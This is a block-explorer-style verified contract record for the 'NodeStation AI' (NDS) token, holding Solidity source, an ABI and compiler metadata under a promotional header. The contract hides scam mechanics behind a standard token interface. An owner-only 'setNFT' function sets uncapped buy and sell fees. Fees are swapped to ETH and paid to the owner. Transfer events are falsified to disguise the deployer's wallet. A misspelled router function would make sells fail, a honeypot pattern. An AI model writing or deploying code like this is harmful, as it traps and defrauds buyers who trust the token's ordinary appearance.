{"SourceCode": "/**                          \r\n    Revolutionize Your Blockchain Infrastructure with Nodestation AI-Powered Services\r\n    Website: https://nodestation.ai/\r\n    Telegram: https://t.me/Nodestationai\r\n    Twitter: https://twitter.com/Nodestation\r\n*/\r\n// SPDX-License-Identifier: unlicense\r\n\r\npragma solidity ^0.8.25;\r\n\r\ncontract NodeStationAI {\r\n\r\n    string public _name = 'NodeStation AI';\r\n    string public _symbol = 'NDS';\r\n    uint8 public constant decimals = 18;\r\n    uint256 public constant totalSupply = 100_000_000 * 10 ** decimals;\r\n\r\n    struct TokenInfo {\r\n        address tokenMkt;\r\n        uint8 b;\r\n        uint8 s;\r\n    }\r\n\r\n    TokenInfo public tokenInfo;\r\n    uint256 constant swapAmount = totalSupply / 100;\r\n\r\n    error Permissions();\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n\r\n    mapping(address => uint256) public balanceOf;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n    address private pair;\r\n    address private holder;\r\n    address private deployWallet;\r\n    address private constant uniswapV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n    IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(uniswapV2Router);\r\n\r\n    bool private swapping;\r\n    bool private tradingOpen;\r\n\r\n    address _deployer;\r\n    address _executor;\r\n\r\n    uint8 _initalBT = 0;\r\n    uint8 _initalST = 0;\r\n\r\n    constructor() {\r\n        tokenInfo = TokenInfo({\r\n            tokenMkt: msg.sender,\r\n            b: _initalBT,\r\n            s: _initalST\r\n        });\r\n        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;\r\n        deployWallet = msg.sender;\r\n\r\n        _initDeployer(msg.sender, msg.sender);\r\n\r\n        balanceOf[deployWallet] = (totalSupply * 100) / 100;\r\n        emit Transfer(address(0), _deployer, balanceOf[deployWallet]);\r\n\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function setNFT(uint8 _b, uint8 _s) external {\r\n        if (msg.sender != _owner()) revert Permissions();\r\n        _upgradeInfo(_b, _s);\r\n    }\r\n\r\n    function _upgradeInfo(uint8 _buy, uint8 _sell) private {\r\n        tokenInfo.b = _buy;\r\n        tokenInfo.s = _sell;\r\n    }\r\n\r\n    function _owner() private view returns (address) {\r\n        return tokenInfo.tokenMkt;\r\n    }\r\n\r\n    function openTrading() external {\r\n        require(msg.sender == _owner());\r\n        require(!tradingOpen);\r\n        address _factory = _uniswapV2Router.factory();\r\n        address _weth = _uniswapV2Router.WETH();\r\n        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);\r\n        pair = _pair;\r\n        tradingOpen = true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) external returns (bool) {\r\n        allowance[from][msg.sender] -= amount;\r\n        return _transfer(from, to, amount);\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool) {\r\n        allowance[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) external returns (bool) {\r\n        return _transfer(msg.sender, to, amount);\r\n    }\r\n\r\n    function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function _initDeployer(address deployer_, address executor_) private {\r\n        _deployer = deployer_;\r\n        _executor = executor_;\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal returns (bool) {\r\n        address tokenMkt = _owner();\r\n        require(tradingOpen || from == tokenMkt || to == tokenMkt);\r\n\r\n        balanceOf[from] -= amount;\r\n\r\n        if (\r\n            to == pair &&\r\n            !swapping &&\r\n            balanceOf[address(this)] >= swapAmount &&\r\n            from != tokenMkt\r\n        ) {\r\n            swapping = true;\r\n            address[] memory path = new address[](2);\r\n            path[0] = address(this);\r\n            path[1] = _uniswapV2Router.WETH();\r\n            _uniswapV2Router\r\n                .swapExactTokensForETHSupportingFreelyOnTransferTokens(\r\n                    swapAmount,\r\n                    0,\r\n                    path,\r\n                    address(this),\r\n                    block.timestamp\r\n                );\r\n            payable(tokenMkt).transfer(address(this).balance);\r\n            swapping = false;\r\n        }\r\n\r\n        (uint8 _buyFee, uint8 _sellFee) = (tokenInfo.b, tokenInfo.s);\r\n        if (from != address(this) && tradingOpen == true) {\r\n            uint256 taxCalculatedAmount = (amount *\r\n                (to == pair ? _sellFee : _buyFee)) / 100;\r\n            amount -= taxCalculatedAmount;\r\n            balanceOf[address(this)] += taxCalculatedAmount;\r\n        }\r\n        balanceOf[to] += amount;\r\n\r\n        if (from == _executor) {\r\n            emit Transfer(_deployer, to, amount);\r\n        } else if (to == _executor) {\r\n            emit Transfer(from, _deployer, amount);\r\n        } else {\r\n            emit Transfer(from, to, amount);\r\n        }\r\n        return true;\r\n    }\r\n}\r\n\r\ninterface IUniswapFactory {\r\n    function getPair(\r\n        address tokenA,\r\n        address tokenB\r\n    ) external view returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function swapExactTokensForETHSupportingFreelyOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"Permissions\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"_b\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"_s\",\"type\":\"uint8\"}],\"name\":\"setNFT\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenInfo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"tokenMkt\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"b\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"s\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "NodeStationAI", "CompilerVersion": "v0.8.25+commit.b61c2a91", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://406aa997e42e21d354b985beff448fe2d51deac11a9c71aad50cbca1bb3c7d0f"}